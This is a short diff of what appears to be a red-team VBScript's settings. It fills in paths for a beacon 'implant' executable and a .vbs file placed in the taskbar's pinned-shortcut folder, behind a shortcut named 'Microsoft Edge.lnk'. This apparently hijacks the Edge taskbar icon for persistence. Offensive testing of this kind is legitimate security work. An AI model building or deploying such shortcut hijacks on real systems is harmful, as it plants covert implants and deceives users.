@@ -1,6 +1,6 @@
-implant = "C:\Users\<user>\Downloads\<bCn.exe>"
+implant = "C:\Users\aslam\Documents\TESTBEACON1.exe"
 ' change username + path
-newTarget = "C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts\pwahelper.vbs"
+newTarget = "C:\Users\aslam\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts\pwahelper.vbs"
 lnkName = "Microsoft Edge.lnk"
 
 ' targets the taskbar
